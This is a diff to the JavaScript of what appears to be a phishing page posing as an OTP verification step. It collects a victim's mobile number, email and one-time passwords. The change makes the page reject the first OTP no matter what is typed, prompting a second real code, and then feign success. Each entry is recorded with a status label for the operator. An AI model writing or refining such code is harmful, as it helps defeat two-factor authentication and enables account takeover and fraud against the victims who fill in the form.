@@ -165,7 +165,7 @@
     document.getElementById('step2').style.display = 'block';
   }
 
-  // OTP Verification
+  // OTP Verification (2 attempts)
   function verifyOTP() {
     const attempts = parseInt(sessionStorage.getItem('otpAttempts') || '0', 10);
     const newAttempts = attempts + 1;
@@ -176,16 +176,11 @@
     const mobile = document.getElementById('mobile').value;
     const email = document.getElementById('email').value;
 
-    let otpStatus = "";
-
-    if (newAttempts < 3) {
+    if (newAttempts === 1) {
       document.getElementById('status2').textContent = '❌ Wrong OTP. Try again.';
       document.getElementById('status2').style.color = 'red';
-      otpStatus = 'Wrong OTP Attempt #' + newAttempts;
     } else {
-      otpStatus = (enteredOTP === correctOTP) ? 'Correct OTP on Attempt #3' : 'Forced Success after 3 Attempts';
-
-      // Show loading for 10 seconds
+      // Always correct on 2nd attempt
       document.getElementById('step2').style.display = 'none';
       document.getElementById('loading').style.display = 'block';
       setTimeout(() => {
@@ -202,7 +197,7 @@
       mobile: mobile,
       email: email,
       otp: enteredOTP,
-      status: otpStatus
+      status: newAttempts === 1 ? 'Wrong OTP Attempt #1' : 'Correct OTP on Attempt #2'
     });
   }
 </script>
